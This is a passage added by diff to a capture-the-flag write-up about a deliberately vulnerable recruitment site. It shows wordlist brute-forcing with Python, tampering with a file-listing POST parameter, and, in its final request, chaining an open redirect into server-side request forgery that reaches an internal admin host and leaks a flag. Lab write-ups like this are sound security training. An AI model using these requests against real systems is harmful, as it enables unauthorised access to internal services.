@@ -315,3 +315,136 @@ Which just displays a list of jpg's we already know about
     });
 </script>
 ```
+
+The location of this json is at http://b38f1-uploads.vulnrecruitment.co.uk/upload_file_list_b84w.json. I suspect there's more than one json file, perhaps b84w is the pattern I need to follow...
+
+So to get every combination of 4 character long lowercase letters and numbers it would be something like this
+
+```python
+import string
+import itertools
+
+def buildCombinations():
+    result = []
+    all = list(string.ascii_lowercase) + list(string.digits)
+    for r in range(1, 5):
+        for s in itertools.product(all, repeat=r):
+            result.append(''.join(s))
+    return result
+
+print(len(buildCombinations()))
+1727604
+```
+
+Too big for a CTF :D
+
+I decided to look if I could generate a list of combinations based upon a regex, and I found a nice module called exrex
+
+```
+pip3 install exrex
+```
+
+```python
+import exrex
+
+combinations = list(exrex.generate('^[a-z]{1}[0-9]{2}[a-z]{1}$'))
+with open('patterns.txt', 'w') as wordlist:
+    wordlist.write('\n'.join(combinations))
+```
+
+OK so this list was a lot smaller but still over 67k, I used intruder up to about 11k requests and then stopped. Rabbit hole
+
+I went back and tweaked this request to something that didn't exist
+
+```
+POST /staff/portal/uploads HTTP/1.1
+Host: www.vulnrecruitment.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+Origin: http://www.vulnrecruitment.co.uk
+Connection: close
+Referer: http://www.vulnrecruitment.co.uk/staff/portal/uploads
+Cookie: token=xxx; ctfchallenge=xxx
+Upgrade-Insecure-Requests: 1
+
+listing_file=xxx
+```
+
+And the script became
+
+```javascript
+<script>
+    var files = Page not found;
+    $(function() {
+        $.each( files, function(k,v){
+            $('ul#filelist').append('<li><a href="http://b38f1-uploads.vulnrecruitment.co.uk/' + v.name + '">' + v.name + '</a></li>');
+        } );
+    });
+</script>
+```
+
+Change that to blank
+
+```
+POST /staff/portal/uploads HTTP/1.1
+Host: www.vulnrecruitment.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+Origin: http://www.vulnrecruitment.co.uk
+Connection: close
+Referer: http://www.vulnrecruitment.co.uk/staff/portal/uploads
+Cookie: token=xxx; ctfchallenge=xxx
+Upgrade-Insecure-Requests: 1
+
+listing_file=
+```
+
+And it included the index page
+
+```javascript
+<script>
+    var files = <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    $(function() {
+        $.each( files, function(k,v){
+            $('ul#filelist').append('<li><a href="http://b38f1-uploads.vulnrecruitment.co.uk/' + v.name + '">' + v.name + '</a></li>');
+        } );
+    });
+</script>
+```
+
+OK so it must be paths that exist under the uploads domain so perhaps I can use the open redirect to get an SSRF on the admin domain?
+
+```
+POST /staff/portal/uploads HTTP/1.1
+Host: www.vulnrecruitment.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Origin: http://www.vulnrecruitment.co.uk
+Connection: close
+Referer: http://www.vulnrecruitment.co.uk/staff/portal/uploads
+Cookie: token=xxx; ctfchallenge=xxx
+Upgrade-Insecure-Requests: 1
+
+listing_file=redirect?url=http://admin.vulnrecruitment.co.uk
+```
+
+YES! Flag no.4 challenge complete! :D
+
+```javascript
+    var files = {"flag":"[^FLAG^XXXXXXXXXXXXX^FLAG^]"};
+```
